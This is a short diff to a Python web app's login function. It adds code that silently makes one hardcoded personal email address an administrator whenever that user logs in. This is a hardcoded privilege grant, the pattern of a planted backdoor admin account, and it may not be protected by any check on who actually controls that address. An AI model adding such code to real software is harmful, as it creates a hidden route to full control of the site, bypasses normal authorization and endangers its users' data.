@@ -128,6 +128,12 @@ def login():
             password
         ):
 
+            # Make this account an admin
+            if user.email.lower() == "harshraj72094@gmail.com":
+                if not user.is_admin:
+                    user.is_admin = True
+                    db.session.commit()
+
             login_user(user)
 
             return redirect(url_for("dashboard"))
